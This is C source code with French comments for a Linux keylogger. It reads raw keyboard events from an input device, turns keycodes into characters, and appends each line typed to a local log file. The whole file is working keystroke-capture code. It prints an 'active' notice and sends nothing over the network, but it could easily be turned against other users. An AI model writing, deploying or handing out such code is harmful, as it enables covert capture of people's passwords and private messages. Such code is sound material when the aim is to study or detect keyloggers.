#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>

#define DEVICE "/dev/input/event4"
#define LOGFILE "keylog.txt"
#define BUFFER_SIZE 1024

// Table de correspondance des touches
const char *keycodes[] = {
    "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
    "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<CTRL>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<SHIFT>", "\\", "z",
    "x", "c", "v", "b", "n", "m", ",", ".", "/", "<SHIFT>", "*", "<ALT>", " ", "<CAPS>"};

int main() {
    struct input_event event;
    int fd;
    char buffer[BUFFER_SIZE] = {0};
    int buffer_index = 0;

    // Ouvrir le fichier d'entree clavier
    fd = open(DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Erreur lors de l'ouverture du périphérique");
        exit(1);
    }

    // Ouvrir le fichier de log
    FILE *logfile = fopen(LOGFILE, "a");
    if (!logfile) {
        perror("Erreur lors de l'ouverture du fichier de log");
        close(fd);
        exit(1);
    }

    printf("Keylogger actif. Tapez et appuyez sur Entrée pour enregistrer. Appuyez sur CTRL+C pour quitter.\n");

    while (1) {
        read(fd, &event, sizeof(struct input_event));

        // Vérifier si une touche est pressee
        if (event.type == EV_KEY && event.value == 1) {
            if (event.code < sizeof(keycodes) / sizeof(keycodes[0])) {
                const char *key = keycodes[event.code];

                if (strcmp(key, "\n") == 0) {
                    buffer[buffer_index] = '\0'; // Terminer la chaîne
                    fprintf(logfile, "%s\n", buffer);
                    fflush(logfile);

                    printf("Enregistré : %s\n", buffer);
                    buffer_index = 0; // Reinitialiser le tampon
                } else if (strcmp(key, "<BACKSPACE>") == 0) {
                    // Gerer la suppression
                    if (buffer_index > 0) {
                        buffer_index--;
                        buffer[buffer_index] = '\0';
                    }
                } else {
                    // Ajouter la touche au tampon
                    if (buffer_index < BUFFER_SIZE - 1) {
                        buffer[buffer_index] = key[0];
                        buffer_index++;
                    }
                }
            }
        }
    }

    // Fermer les fichiers
    fclose(logfile);
    close(fd);

    return 0;
}
